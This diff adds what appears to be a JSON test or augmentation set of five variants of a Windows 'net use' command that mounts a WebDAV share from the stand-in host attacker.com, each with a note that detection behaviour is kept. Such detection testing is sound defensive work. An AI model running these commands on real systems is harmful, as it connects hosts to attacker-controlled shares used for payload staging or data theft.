@@ -1,0 +1,22 @@
+[
+  {
+    "output": "net use Z: \"http://attacker.com/share\"",
+    "explanation": "The original command is modified by adding quotes around the URL for safe parsing, which is a valid insertion technique."
+  },
+  {
+    "output": "net use Z: http://attacker.com/share",
+    "explanation": "The original command is modified by omitting quotes around the URL, which is still valid in many command-line contexts."
+  },
+  {
+    "output": "net use Z: \"http://attacker.com/share\" /user:username",
+    "explanation": "The original command is extended with an optional /user flag, which does not affect the core behavior of mounting the WebDAV share."
+  },
+  {
+    "output": "net use Z: http://attacker.com/share /persistent:no",
+    "explanation": "The original command is modified by adding a non-essential /persistent flag with a value, which does not alter the core detection behavior."
+  },
+  {
+    "output": "net use Z: http://attacker.com/share /user:username /persistent:no",
+    "explanation": "The original command is modified by adding optional flags in a different order, which is valid and does not affect detection."
+  }
+]
